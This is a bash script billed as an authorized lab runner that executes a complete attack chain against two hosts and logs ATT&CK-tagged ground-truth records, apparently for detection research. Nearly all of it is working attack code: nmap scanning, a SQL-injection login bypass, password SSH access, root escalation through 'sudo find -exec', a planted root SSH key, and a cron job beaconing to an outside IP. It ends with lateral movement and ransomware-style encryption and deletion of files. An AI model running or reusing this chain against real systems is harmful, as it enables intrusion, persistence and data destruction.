#!/bin/bash
# L1 runner v2 (authorized lab). Verifies each stage; ground truth labels only confirmed executions.
set -u
V1=10.30.1.179; V2=10.30.2.144; WEB="http://$V1"; P='Autumn2026!Reused'
TS=$(date -u +%Y%m%dT%H%M%SZ); GT="$HOME/gt_L1_$TS.jsonl"; RUNID="L1-$TS"
ATK=$HOME/.ssh/atk_ed25519; ATKPUB=$(cat $ATK.pub)
PS(){ python3 /tmp/pssh.py "$1" "$2" "$P" 2>/dev/null; }     # password ssh to victim
gt(){ printf '{"run":"%s","ts":"%s","stage":"%s","technique":"%s","target":"%s","status":"%s","evidence":"%s"}\n' \
      "$RUNID" "$(date -u +%FT%TZ)" "$1" "$2" "$3" "$4" "$5" | tee -a "$GT"; }
echo "=== $RUNID start $(date -u +%FT%TZ) ==="

nmap -Pn -sV -p22,80 $V1 >/dev/null 2>&1 && gt initial_compromise T1595 $V1 ok "nmap 22,80" || gt initial_compromise T1595 $V1 fail nmap

code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 12 -H 'Content-Type: application/json' -X POST "$WEB/rest/user/login" --data '{"email":"'"'"' OR 1=1--","password":"x"}')
users=$(curl -s --max-time 12 "$WEB/api/Users" | head -c 40)
[ -n "$users" ] && gt initial_compromise T1190 $V1 ok "sqli login http=$code; /api/Users leaked" || gt initial_compromise T1190 $V1 fail "http=$code"

who=$(PS dmorris@$V1 'id -un; hostname')
echo "$who" | grep -q dmorris && gt initial_compromise T1078 $V1 ok "foothold $(echo $who|tr '\n' ' ')" || { gt initial_compromise T1078 $V1 fail "$who"; echo ABORT; exit 1; }

PS dmorris@$V1 'uname -a; id; sudo -l; ss -tlnp; crontab -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null|head' >/dev/null && gt execution_discovery T1082 $V1 ok "uname/id/sudo-l/ss/suid"

root=$(PS dmorris@$V1 'sudo /usr/bin/find /etc/hostname -exec id -u \;' | tr -d '[:space:]')
[ "$root" = "0" ] && gt privilege_escalation T1548.003 $V1 ok "sudo find->uid0" || { gt privilege_escalation T1548.003 $V1 fail "uid=$root"; echo ABORT; exit 1; }

PS dmorris@$V1 "sudo /usr/bin/find /etc/hostname -exec sh -c 'install -d -m700 /root/.ssh; grep -qF \"$ATKPUB\" /root/.ssh/authorized_keys 2>/dev/null || echo \"$ATKPUB\" >> /root/.ssh/authorized_keys' \;"
chk=$(PS dmorris@$V1 "sudo /usr/bin/find /etc/hostname -exec grep -cF 'attacker@kltn' /root/.ssh/authorized_keys \;" | tr -d '[:space:]')
[ "${chk:-0}" -ge 1 ] && gt persistence T1098.004 $V1 ok "root authorized_keys implant" || gt persistence T1098.004 $V1 fail "chk=$chk"

PS dmorris@$V1 "sudo /usr/bin/find /etc/hostname -exec sh -c 'echo \"*/10 * * * * root curl -fsS --max-time 5 http://203.0.113.66/beacon >/dev/null 2>&1\" > /etc/cron.d/kltn-lab-beacon' \;"
cron=$(PS dmorris@$V1 "sudo /usr/bin/find /etc/hostname -exec test -f /etc/cron.d/kltn-lab-beacon \; -exec echo yes \;" | tr -d '[:space:]')
[ "$cron" = "yes" ] && gt persistence T1053.003 $V1 ok "cron beacon /etc/cron.d" || gt persistence T1053.003 $V1 fail "cron=$cron"

lat=$(PS dmorris@$V1 "python3 /tmp/pssh.py dmorris@$V2 'id -un; hostname' '$P' 2>/dev/null")
echo "$lat" | grep -q ubuntu-2 && gt lateral_movement T1021.004 $V2 ok "ssh v1->v2 $(echo $lat|tr '\n' ' ')" || gt lateral_movement T1021.004 $V2 fail "$lat"

for V in $V1 $V2; do
 PS dmorris@$V "sudo /usr/bin/find /etc/hostname -exec sh -c 'for f in /opt/kltn-canary/*.txt; do openssl enc -aes-256-cbc -pbkdf2 -pass pass:LABKEY-L1 -in \"\$f\" -out \"\$f.enc\" 2>/dev/null && rm -f \"\$f\"; done' \;"
 enc=$(PS dmorris@$V "ls /opt/kltn-canary/*.enc 2>/dev/null | wc -l" | tr -d '[:space:]')
 [ "${enc:-0}" -ge 1 ] && gt impact T1486 $V ok "canary encrypted ($enc files)" || gt impact T1486 $V fail "enc=$enc"
done
echo "=== $RUNID end $(date -u +%FT%TZ) ==="; echo "GT=$GT"; cat "$GT"
